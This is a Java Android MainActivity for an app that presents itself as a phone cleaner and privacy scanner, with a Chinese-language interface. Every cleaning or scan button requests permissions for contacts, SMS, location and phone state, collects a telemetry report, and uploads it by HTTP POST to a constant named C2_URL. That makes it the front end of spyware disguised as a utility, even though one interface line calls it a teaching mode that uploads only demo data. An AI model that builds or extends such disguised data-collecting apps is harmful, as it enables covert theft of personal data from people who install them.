package com.demo.phonehelper;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.demo.phonehelper.data.DataCollector;
import com.demo.phonehelper.data.NetworkUploader;
import com.demo.phonehelper.data.StorageManager;
import com.demo.phonehelper.model.TelemetryReport;
import com.demo.phonehelper.model.UploadResult;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.snackbar.Snackbar;

import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    private SwipeRefreshLayout swipeRefreshLayout;
    private LinearLayout progressPanel;
    private ProgressBar progressBar;
    private TextView progressText;
    private TextView scoreText;
    private TextView dashboardStatusText;
    private TextView lastScanText;
    private TextView deviceLabelText;
    private TextView reportSummaryText;
    private TextView uploadStatusText;
    private TextView localPathText;
    private TextView storageStatusText;
    private TextView networkStatusText;
    private TextView permissionStatusText;
    private TextView trafficStatusText;
    private MaterialButton buttonQuickClean;
    private MaterialButton buttonDeepBoost;
    private MaterialButton buttonPrivacyScan;
    private MaterialButton buttonSyncCheck;

    private final ActivityResultLauncher<String[]> permissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::onPermissionResult);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        bindViews();
        bindActions();
        refreshDashboardPreview();
    }

    private void bindViews() {
        swipeRefreshLayout = findViewById(R.id.swipe_refresh);
        progressPanel = findViewById(R.id.panel_progress);
        progressBar = findViewById(R.id.progress_indicator);
        progressText = findViewById(R.id.text_progress);
        scoreText = findViewById(R.id.text_score);
        dashboardStatusText = findViewById(R.id.text_dashboard_status);
        lastScanText = findViewById(R.id.text_last_scan);
        deviceLabelText = findViewById(R.id.text_device_label);
        reportSummaryText = findViewById(R.id.text_report_summary);
        uploadStatusText = findViewById(R.id.text_upload_status);
        localPathText = findViewById(R.id.text_local_path);
        storageStatusText = findViewById(R.id.text_storage_status);
        networkStatusText = findViewById(R.id.text_network_status);
        permissionStatusText = findViewById(R.id.text_permission_status);
        trafficStatusText = findViewById(R.id.text_traffic_status);
        buttonQuickClean = findViewById(R.id.button_quick_clean);
        buttonDeepBoost = findViewById(R.id.button_deep_boost);
        buttonPrivacyScan = findViewById(R.id.button_privacy_scan);
        buttonSyncCheck = findViewById(R.id.button_sync_check);
    }

    private void bindActions() {
        swipeRefreshLayout.setOnRefreshListener(this::refreshDashboardPreview);
        buttonQuickClean.setOnClickListener(view -> startWorkflow("quick_clean", "一键清理"));
        buttonDeepBoost.setOnClickListener(view -> startWorkflow("deep_boost", "深度优化"));
        buttonPrivacyScan.setOnClickListener(view -> startWorkflow("privacy_scan", "隐私巡检"));
        buttonSyncCheck.setOnClickListener(view -> startWorkflow("network_sync", "网络同步检测"));
    }

    private void refreshDashboardPreview() {
        executorService.execute(() -> {
            try {
                TelemetryReport report = DataCollector.collect(this, "dashboard_refresh");
                runOnUiThread(() -> {
                    applyPreview(report);
                    swipeRefreshLayout.setRefreshing(false);
                });
            } catch (Exception ex) {
                runOnUiThread(() -> {
                    swipeRefreshLayout.setRefreshing(false);
                    Snackbar.make(findViewById(R.id.root_layout), "刷新首页失败：" + ex.getMessage(), Snackbar.LENGTH_LONG).show();
                });
            }
        });
    }

    private void startWorkflow(String actionName, String actionLabel) {
        if (!hasAnyHighRiskPermission()) {
            permissionLauncher.launch(new String[]{
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.READ_PHONE_STATE
            });
        }

        showBusyState(true, actionLabel + "执行中...");
        executorService.execute(() -> {
            try {
                TelemetryReport report = DataCollector.collect(this, actionName);
                String localPath = StorageManager.save(this, report.toJsonString());
                UploadResult uploadResult = NetworkUploader.upload(report.toJsonString());
                runOnUiThread(() -> {
                    applyReport(report, uploadResult, localPath, actionLabel);
                    showBusyState(false, null);
                    Snackbar.make(findViewById(R.id.root_layout), actionLabel + "已完成", Snackbar.LENGTH_LONG).show();
                });
            } catch (Exception ex) {
                runOnUiThread(() -> {
                    showBusyState(false, null);
                    Snackbar.make(findViewById(R.id.root_layout), actionLabel + "失败：" + ex.getMessage(), Snackbar.LENGTH_LONG).show();
                });
            }
        });
    }

    private void applyPreview(TelemetryReport report) {
        scoreText.setText(String.valueOf(report.getSecurityScore()));
        dashboardStatusText.setText(report.getRiskHeadline());
        lastScanText.setText(getString(R.string.last_scan_format, report.getGeneratedAt(), "首页刷新"));
        deviceLabelText.setText(report.getDeviceSummary());
        reportSummaryText.setText("环境巡检已就绪，点击任意操作会在后台写入本地报告并发起同步。");
        uploadStatusText.setText("目标地址：" + BuildConfig.C2_URL);
        localPathText.setText("本次仅刷新仪表盘，尚未写入本地报告。");
        storageStatusText.setText(getString(R.string.storage_status_format, report.getJunkSizeMb(), report.getMemoryFreedMb()));
        networkStatusText.setText("同步目标：" + BuildConfig.C2_URL.replace("http://", "") + " · HTTP POST");
        permissionStatusText.setText(report.getPermissionSummary());
        trafficStatusText.setText("教学模式：仅上传演示 JSON 与运行环境摘要。 ");
    }

    private void applyReport(TelemetryReport report, UploadResult uploadResult, String localPath, String actionLabel) {
        scoreText.setText(String.valueOf(report.getSecurityScore()));
        dashboardStatusText.setText(report.getRiskHeadline());
        lastScanText.setText(getString(R.string.last_scan_format, report.getGeneratedAt(), actionLabel));
        deviceLabelText.setText(report.getDeviceSummary());
        reportSummaryText.setText("最近一次操作已生成本地巡检报告，并完成对固定目标地址的后台同步。");

        if (uploadResult.isSuccess()) {
            uploadStatusText.setText(getString(
                    R.string.upload_status_success,
                    uploadResult.getResponseCode(),
                    uploadResult.getSentBytes()
            ));
        } else {
            uploadStatusText.setText(getString(R.string.upload_status_failure, uploadResult.getResponsePreview()));
        }

        localPathText.setText(getString(R.string.local_path_format, localPath));
        storageStatusText.setText(getString(R.string.storage_status_format, report.getJunkSizeMb(), report.getMemoryFreedMb()));
        networkStatusText.setText(getString(R.string.network_status_format, uploadResult.getDestination(), uploadResult.getResponseCode()));
        permissionStatusText.setText(report.getPermissionSummary());
        trafficStatusText.setText("响应预览：" + uploadResult.getResponsePreview());
    }

    private void showBusyState(boolean busy, String message) {
        progressPanel.setVisibility(busy ? android.view.View.VISIBLE : android.view.View.GONE);
        progressBar.setIndeterminate(busy);
        progressText.setText(message == null ? getString(R.string.progress_idle) : message);

        buttonQuickClean.setEnabled(!busy);
        buttonDeepBoost.setEnabled(!busy);
        buttonPrivacyScan.setEnabled(!busy);
        buttonSyncCheck.setEnabled(!busy);
    }

    private boolean hasAnyHighRiskPermission() {
        return hasPermission(Manifest.permission.READ_CONTACTS)
                || hasPermission(Manifest.permission.READ_SMS)
                || hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                || hasPermission(Manifest.permission.READ_PHONE_STATE);
    }

    private boolean hasPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private void onPermissionResult(Map<String, Boolean> result) {
        int granted = 0;
        for (Boolean value : result.values()) {
            if (Boolean.TRUE.equals(value)) {
                granted++;
            }
        }
        Snackbar.make(findViewById(R.id.root_layout), "已授权 " + granted + " 项敏感权限", Snackbar.LENGTH_SHORT).show();
        refreshDashboardPreview();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executorService.shutdownNow();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
